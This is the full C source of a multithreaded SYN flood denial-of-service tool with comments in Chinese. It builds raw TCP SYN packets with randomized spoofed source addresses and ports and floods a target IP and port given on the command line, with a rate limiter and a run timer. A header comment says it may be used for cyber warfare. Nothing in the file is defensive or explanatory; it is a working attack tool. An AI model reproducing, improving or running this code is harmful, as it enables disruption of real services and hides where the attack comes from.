/*
        This is released under the GNU GPL License v3.0, and is allowed to be used for cyber warfare. ;)
*/
#include <unistd.h> // 包含与UNIX标准相关的函数定义
#include <time.h> // 时间头文件
#include <sys/types.h> // 包含基本数据类型定义
#include <sys/socket.h> // 套接字头文件
#include <sys/ioctl.h> // 输入输出控制头文件
#include <string.h> // 字符串操作头文件
#include <stdlib.h> // 标准库头文件
#include <stdio.h> // 标准输入输出头文件
#include <pthread.h> // 线程头文件
#include <netinet/tcp.h> // TCP协议头文件
#include <netinet/ip.h> // IP协议头文件
#include <netinet/in.h> // Internet网络功能头文件
#include <netinet/if_ether.h> // 以太网帧头文件
#include <netdb.h> // 主机数据库头文件
#include <net/if.h> // 网络接口头文件
#include <arpa/inet.h> // Internet网络功能头文件

#define MAX_PACKET_SIZE 4096 // 最大数据包大小
#define PHI 0x9e3779b9 // 常量用于随机数生成器

static unsigned long int Q[4096], c = 362436; // 随机数生成器数组及初始值
static unsigned int floodport; // 泛洪端口
volatile int limiter; // 限制器变量
volatile unsigned int pps; // 每秒数据包数
volatile unsigned int sleeptime = 100; // 睡眠时间

void init_rand(unsigned long int x) // 初始化随机数生成器
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++) { Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; } // 初始化剩余数组元素
}

unsigned long int rand_cmwc(void) // 随机数生成函数
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x); // 返回随机数
}

unsigned short csum (unsigned short *buf, int count) // 计算校验和
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum); // 返回校验和的一补码
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) { // 计算TCP校验和
        struct tcp_pseudo // TCP伪头部结构体
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo)); // 复制伪头部
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr)); // 复制TCP头部
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output; // 返回校验和
}

void setup_ip_header(struct iphdr *iph) // 设置IP头部
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = 6;
        iph->check = 0;
        iph->saddr = inet_addr("192.168.3.100"); // 设置源IP地址
}

void setup_tcp_header(struct tcphdr *tcph) // 设置TCP头部
{
        tcph->source = htons(5678); // 设置源端口
        tcph->seq = rand();
        tcph->ack_seq = 1;
        tcph->res2 = 1;
        tcph->doff = 5;
        tcph->syn = 1; // 设置SYN标志
        tcph->window = htons(65535);
        tcph->check = 1;
        tcph->urg_ptr = 1;
}

void *flood(void *par1) // 发送数据包的线程函数
{
        char *td = (char *)par1; // 目标IP地址
        char datagram[MAX_PACKET_SIZE]; // 数据报缓冲区
        struct iphdr *iph = (struct iphdr *)datagram; // IP头部指针
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); // TCP头部指针
        
        struct sockaddr_in sin; // 目标地址结构体
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport); // 设置目标端口
        sin.sin_addr.s_addr = inet_addr(td); // 设置目标IP地址
        
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // 创建原始套接字
        if(s < 0){
                fprintf(stderr, "Could not open raw socket.\n");
                exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE); // 清空数据报
        setup_ip_header(iph); // 设置IP头部
        setup_tcp_header(tcph); // 设置TCP头部
        
        tcph->dest = htons(floodport); // 设置目标端口
        
        iph->daddr = sin.sin_addr.s_addr; // 设置目标IP地址
        iph->check = csum ((unsigned short *) datagram, iph->tot_len); // 计算IP头部校验和
        
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){ // 设置套接字选项
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
        
        init_rand(time(NULL)); // 初始化随机数生成器
        register unsigned int i;
        i = 0;
        while(1){
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); // 发送数据报
                
                iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF); // 设置新的源IP地址
                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF); // 设置新的标识
                iph->check = csum ((unsigned short *) datagram, iph->tot_len); // 重新计算IP头部校验和
                tcph->seq = rand_cmwc() & 0xFFFF; // 设置新的序列号
                tcph->source = htons(rand_cmwc() & 0xFFFF); // 设置新的源端口
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph); // 重新计算TCP头部校验和
                
                pps++; // 增加每秒数据包计数
                if(i >= limiter)
                {
                        i = 0;
                        usleep(sleeptime); // 休眠一定时间
                }
                i++;
        }
}

int main(int argc, char *argv[]) // 主函数
{
        if(argc < 6){
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "Usage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]); // 显示使用方法
                exit(-1);
        }

        fprintf(stdout, "Setting up Sockets...\n");

        int num_threads = atoi(argv[3]);
        floodport = atoi(argv[2]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads]; // 线程数组
        
        int multiplier = 20;

        int i;
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]); // 创建线程
        }
        fprintf(stdout, "Starting Flood...\n");
        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
        {
                usleep((1000/multiplier)*1000); // 休眠一定时间
                if((pps*multiplier) > maxpps)
                {
                        if(1 > limiter)
                        {
                                sleeptime+=100; // 增加睡眠时间
                        } else {
                                limiter--;
                        }
                } else {
                        limiter++;
                        if(sleeptime > 25)
                        {
                                sleeptime-=25; // 减少睡眠时间
                        } else {
                                sleeptime = 0;
                        }
                }
                pps = 0;
        }

        return 0;
}